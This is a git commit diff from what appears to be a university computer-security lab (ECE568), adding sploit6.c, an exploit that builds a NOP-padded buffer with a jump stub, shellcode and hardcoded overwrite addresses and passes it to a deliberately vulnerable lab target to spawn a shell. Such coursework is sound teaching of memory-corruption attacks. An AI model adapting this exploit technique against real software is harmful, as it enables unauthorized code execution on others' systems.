08ce8e2cb917ac50f3b9ef6c02dd83d45bcd2701
Ziwen  Wang <wang2213@p124.ecf.utoronto.ca>
2020-10-09 11:15:01 -0400

    p6

--- ece568-lab1-2020f/sploits/sploit6.c
+++ ece568-lab1-2020f/sploits/sploit6.c
@@ -5,20 +5,57 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target6"
-
-int main(void)
+#define DEFAULT_BUFFER_SIZE  192
+#define NOP 0x90
+int
+main ( int argc, char * argv[] )
 {
-  char *args[3];
-  char *env[1];
+	char *	args[3];
+	char *	env[1];
+	char *buff, *ptr;
+	int bsize=DEFAULT_BUFFER_SIZE;
+	int i;
 
-  args[0] = TARGET; 
-  args[1] = "hi there"; 
-  args[2] = NULL;
-  
-  env[0] = NULL;
+	if (argc>1) bsize = atoi(argv[1]);
+	
+	if (!(buff = malloc(bsize* sizeof(char)))){
+		printf("can't allocate memory\n");
+		exit(0);
+	}
+	
 
-  if (0 > execve(TARGET, args, env))
-    fprintf(stderr, "execve failed.\n");
 
-  return 0;
+	for (i=0; i<bsize; i++){
+		buff[i] = NOP;
+	}
+	
+	ptr = buff;
+	char * ft = "\xeb\x08\x01\x01";
+	for (i=0; i<4; i++){
+		*(ptr++) = ft[i];
+	}
+
+	for (i=0; i<4; i++){
+		*(ptr++) = shellcode[i];
+	}
+
+	ptr = buff + 27;
+	for (i=0; i<strlen(shellcode); i++){
+		*(ptr++) = shellcode[i];
+	}
+	
+	char * s = "\x28\xee\x04\x01\x68\xfe\xa4\x40";
+	for (i=0; i<8; i++){
+		*(ptr++) = s[i];
+	}
+	buff[bsize-1] = '\0';
+	args[0] = TARGET;
+	args[1] = buff;
+	args[2] = NULL;
+	env[0] = NULL;
+
+	if ( execve (TARGET, args, env) < 0 )
+		fprintf (stderr, "execve failed.\n");
+	int b =0;
+	return (0);
 }
